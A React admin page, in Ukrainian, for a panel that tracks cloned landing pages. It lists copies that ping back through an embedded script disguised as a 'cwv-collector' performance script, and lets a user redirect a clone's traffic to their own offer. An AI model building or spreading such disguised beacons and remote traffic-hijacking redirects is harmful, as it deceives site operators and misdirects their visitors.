import PanelLayout from '@/Layouts/PanelLayout';
import { router, useForm, usePage } from '@inertiajs/react';
import { useMemo, useState } from 'react';

function statusBadge(status, redirectEnabled) {
    if (redirectEnabled) {
        return <span className="badge badge-ok">Редірект</span>;
    }

    switch (status) {
        case 'new':
            return <span className="badge badge-warn">Нове</span>;
        case 'ignored':
            return <span className="badge">Ігнор</span>;
        case 'watching':
            return <span className="badge">Спостерігаємо</span>;
        default:
            return <span className="badge">{status}</span>;
    }
}

function MirrorRow({ mirror, offers, showUserColumn }) {
    const [open, setOpen] = useState(false);
    const { data, setData, patch, processing, errors, delete: destroy } = useForm({
        redirect_enabled: Boolean(mirror.redirect_enabled),
        redirect_offer_id: mirror.redirect_offer_id || '',
        redirect_url: mirror.redirect_url || '',
        status: mirror.status || 'watching',
        notes: mirror.notes || '',
    });

    const save = (event) => {
        event.preventDefault();
        patch(route('mirrors.update', mirror.id), { preserveScroll: true });
    };

    const remove = () => {
        if (!window.confirm(`Видалити ${mirror.host}?`)) {
            return;
        }
        destroy(route('mirrors.destroy', mirror.id), { preserveScroll: true });
    };

    const onOfferChange = (value) => {
        const id = value ? Number(value) : '';
        setData((prev) => {
            const offer = offers.find((item) => item.id === id);
            return {
                ...prev,
                redirect_offer_id: id,
                redirect_url: offer ? `https://${offer.domain}/` : prev.redirect_url,
            };
        });
    };

    return (
        <>
            <tr>
                <td>
                    <div style={{ fontWeight: 600 }}>{mirror.host}</div>
                    <div className="field-hint" style={{ margin: 0 }}>
                        {mirror.last_path || '/'}
                    </div>
                </td>
                {showUserColumn && <td>{mirror.user_email || '—'}</td>}
                <td>{statusBadge(mirror.status, mirror.redirect_enabled)}</td>
                <td>{mirror.hit_count}</td>
                <td>
                    <div>{mirror.last_seen_at || '—'}</div>
                    <div className="field-hint" style={{ margin: 0 }}>
                        перший: {mirror.first_seen_at || '—'}
                    </div>
                </td>
                <td>
                    {mirror.redirect_enabled ? (
                        <a href={mirror.redirect_url} target="_blank" rel="noreferrer">
                            {mirror.redirect_offer_domain || mirror.redirect_url}
                        </a>
                    ) : (
                        '—'
                    )}
                </td>
                <td>
                    <div className="btn-row" style={{ gap: '0.35rem' }}>
                        <button type="button" className="btn btn-ghost btn-sm" onClick={() => setOpen((v) => !v)}>
                            {open ? 'Сховати' : 'Керувати'}
                        </button>
                    </div>
                </td>
            </tr>
            {open && (
                <tr>
                    <td colSpan={showUserColumn ? 7 : 6}>
                        <form onSubmit={save} className="card" style={{ margin: '0.25rem 0 0.75rem' }}>
                            <div className="field">
                                <label className="field-check" htmlFor={`redir-${mirror.id}`}>
                                    <input
                                        id={`redir-${mirror.id}`}
                                        type="checkbox"
                                        checked={data.redirect_enabled}
                                        onChange={(e) => setData('redirect_enabled', e.target.checked)}
                                    />
                                    <span>Увімкнути редірект трафіку на мій офер</span>
                                </label>
                            </div>

                            <div className="field" style={{ display: 'grid', gap: '0.75rem', gridTemplateColumns: '1fr 1fr' }}>
                                <div>
                                    <label htmlFor={`offer-${mirror.id}`}>Офер призначення</label>
                                    <select
                                        id={`offer-${mirror.id}`}
                                        value={data.redirect_offer_id || ''}
                                        onChange={(e) => onOfferChange(e.target.value)}
                                    >
                                        <option value="">— обрати —</option>
                                        {offers.map((offer) => (
                                            <option key={offer.id} value={offer.id}>
                                                {offer.label}
                                            </option>
                                        ))}
                                    </select>
                                </div>
                                <div>
                                    <label htmlFor={`url-${mirror.id}`}>Або URL вручну</label>
                                    <input
                                        id={`url-${mirror.id}`}
                                        type="text"
                                        value={data.redirect_url}
                                        onChange={(e) => setData('redirect_url', e.target.value)}
                                        placeholder="https://my-offer.com/"
                                    />
                                </div>
                            </div>

                            <div className="field" style={{ display: 'grid', gap: '0.75rem', gridTemplateColumns: '180px 1fr' }}>
                                <div>
                                    <label htmlFor={`status-${mirror.id}`}>Статус</label>
                                    <select
                                        id={`status-${mirror.id}`}
                                        value={data.status}
                                        onChange={(e) => setData('status', e.target.value)}
                                    >
                                        <option value="new">Нове</option>
                                        <option value="watching">Спостерігаємо</option>
                                        <option value="redirecting">Редірект</option>
                                        <option value="ignored">Ігнор</option>
                                    </select>
                                </div>
                                <div>
                                    <label htmlFor={`notes-${mirror.id}`}>Нотатки</label>
                                    <input
                                        id={`notes-${mirror.id}`}
                                        type="text"
                                        value={data.notes}
                                        onChange={(e) => setData('notes', e.target.value)}
                                        placeholder="хто скопіював / коментар"
                                    />
                                </div>
                            </div>

                            {(errors.redirect_url || errors.redirect_enabled) && (
                                <p className="field-hint" style={{ color: '#f87171' }}>
                                    {errors.redirect_url || errors.redirect_enabled}
                                </p>
                            )}

                            <div className="btn-row">
                                <button type="submit" className="btn btn-primary btn-sm" disabled={processing}>
                                    {processing ? 'Збереження…' : 'Зберегти'}
                                </button>
                                <button type="button" className="btn btn-ghost btn-sm" onClick={remove} disabled={processing}>
                                    Видалити
                                </button>
                            </div>
                        </form>
                    </td>
                </tr>
            )}
        </>
    );
}

function ProbeSnippetCard({ probe }) {
    const [copied, setCopied] = useState(false);
    const [open, setOpen] = useState(true);
    const snippet = probe?.snippet || '';
    const endpoint = probe?.endpoint || '';

    const copy = async () => {
        if (!snippet) {
            return;
        }
        try {
            await navigator.clipboard.writeText(snippet);
        } catch {
            const ta = document.createElement('textarea');
            ta.value = snippet;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
        }
        setCopied(true);
        window.setTimeout(() => setCopied(false), 2000);
    };

    if (!snippet) {
        return null;
    }

    return (
        <div className="card mirrors-probe-card" style={{ marginBottom: '1rem' }}>
            <div className="btn-row" style={{ justifyContent: 'space-between', alignItems: 'flex-start', gap: '0.75rem' }}>
                <div>
                    <h3 style={{ margin: 0 }}>Тестовий JS (cwv-collector)</h3>
                    <p className="field-hint" style={{ margin: '0.35rem 0 0' }}>
                        Скопіюй і встав перед <code>&lt;/body&gt;</code> на будь-якому ленді — пінг прилетить сюди.
                    </p>
                </div>
                <div className="btn-row" style={{ gap: '0.4rem', margin: 0 }}>
                    <button type="button" className="btn btn-ghost btn-sm" onClick={() => setOpen((v) => !v)}>
                        {open ? 'Сховати' : 'Показати'}
                    </button>
                    <button type="button" className={`btn btn-sm ${copied ? 'btn-primary' : 'btn-ghost'}`} onClick={copy}>
                        {copied ? 'Скопійовано' : 'Копіювати'}
                    </button>
                </div>
            </div>

            {open && (
                <>
                    <p className="field-hint" style={{ marginTop: '0.85rem' }}>
                        Endpoint: <code>{endpoint}</code>
                    </p>
                    <textarea
                        className="mirrors-probe-code"
                        readOnly
                        value={snippet.trim()}
                        rows={8}
                        onFocus={(e) => e.target.select()}
                        spellCheck={false}
                    />
                </>
            )}
        </div>
    );
}

export default function MirrorsIndex({
    mirrors,
    filters,
    offers = [],
    users = [],
    showUserColumn = false,
    stats = {},
    probe = null,
}) {
    const { flash } = usePage().props;
    const rows = mirrors?.data ?? [];

    const statusOptions = useMemo(
        () => [
            { value: '', label: 'Усі статуси' },
            { value: 'new', label: 'Нове' },
            { value: 'watching', label: 'Спостерігаємо' },
            { value: 'redirecting', label: 'Редірект' },
            { value: 'ignored', label: 'Ігнор' },
        ],
        [],
    );

    const reload = (next = {}) => {
        const params = { ...filters, ...next };
        Object.keys(params).forEach((key) => {
            if (params[key] === '' || params[key] === null || params[key] === undefined) {
                delete params[key];
            }
        });
        router.get(route('mirrors.index'), params, { preserveState: true, preserveScroll: true });
    };

    return (
        <PanelLayout title="Дзеркала" fullWidth>
            <div className="offers-page">
                <header className="page-header">
                    <h2>Дзеркала</h2>
                    <p>
                        Чужі копії лендів, які пінгують нашу панель. Увімкни редірект — і трафік піде на твій офер.
                    </p>
                </header>

                {flash?.success && (
                    <div className="card" style={{ marginBottom: '1rem', borderColor: '#34d399' }}>
                        <p className="card-desc" style={{ color: '#34d399', margin: 0 }}>{flash.success}</p>
                    </div>
                )}

                <div className="dashboard-kpi-grid" style={{ marginBottom: '1rem' }}>
                    <div className="kpi-card">
                        <div className="kpi-card-label">Усього</div>
                        <div className="kpi-card-value">{stats.total ?? 0}</div>
                    </div>
                    <div className="kpi-card">
                        <div className="kpi-card-label">Нові</div>
                        <div className="kpi-card-value accent">{stats.new ?? 0}</div>
                    </div>
                    <div className="kpi-card">
                        <div className="kpi-card-label">З редіректом</div>
                        <div className="kpi-card-value">{stats.redirecting ?? 0}</div>
                    </div>
                </div>

                <ProbeSnippetCard probe={probe} />

                <div className="card" style={{ marginBottom: '1rem' }}>
                    <div className="filter-bar" style={{ marginBottom: 0 }}>
                        <select
                            value={filters.status || ''}
                            onChange={(e) => reload({ status: e.target.value, page: 1 })}
                            style={{ minWidth: 180 }}
                        >
                            {statusOptions.map((opt) => (
                                <option key={opt.value || 'all'} value={opt.value}>{opt.label}</option>
                            ))}
                        </select>
                        {showUserColumn && (
                            <select
                                value={filters.user_id || ''}
                                onChange={(e) => reload({ user_id: e.target.value, page: 1 })}
                                style={{ minWidth: 220 }}
                            >
                                <option value="">Усі користувачі</option>
                                {users.map((user) => (
                                    <option key={user.id} value={user.id}>{user.email}</option>
                                ))}
                            </select>
                        )}
                    </div>
                    <p className="field-hint" style={{ marginTop: '0.75rem', marginBottom: 0 }}>
                        На оферах скрипт підключається як <code>cwv-collector.js</code>. Для тесту — блок вище (готовий inline).
                    </p>
                </div>

                <div className="table-wrap">
                    <table className="data-table offers-table">
                        <thead>
                            <tr>
                                <th>Домен-клон</th>
                                {showUserColumn && <th>Власник токена</th>}
                                <th>Статус</th>
                                <th>Хіти</th>
                                <th>Останній пінг</th>
                                <th>Редірект</th>
                                <th />
                            </tr>
                        </thead>
                        <tbody>
                            {rows.length === 0 ? (
                                <tr>
                                    <td colSpan={showUserColumn ? 7 : 6} style={{ textAlign: 'center', opacity: 0.7 }}>
                                        Поки тихо. Коли хтось скопіює ленд зі скриптом — зʼявиться тут і в Telegram.
                                    </td>
                                </tr>
                            ) : (
                                rows.map((mirror) => (
                                    <MirrorRow
                                        key={mirror.id}
                                        mirror={mirror}
                                        offers={offers}
                                        showUserColumn={showUserColumn}
                                    />
                                ))
                            )}
                        </tbody>
                    </table>
                </div>

                {mirrors?.last_page > 1 && (
                    <div className="btn-row" style={{ marginTop: '1rem' }}>
                        <button
                            type="button"
                            className="btn btn-ghost btn-sm"
                            disabled={mirrors.current_page <= 1}
                            onClick={() => reload({ page: mirrors.current_page - 1 })}
                        >
                            ← Назад
                        </button>
                        <span className="field-hint" style={{ margin: 0 }}>
                            {mirrors.current_page} / {mirrors.last_page} · {mirrors.total}
                        </span>
                        <button
                            type="button"
                            className="btn btn-ghost btn-sm"
                            disabled={mirrors.current_page >= mirrors.last_page}
                            onClick={() => reload({ page: mirrors.current_page + 1 })}
                        >
                            Далі →
                        </button>
                    </div>
                )}
            </div>
        </PanelLayout>
    );
}
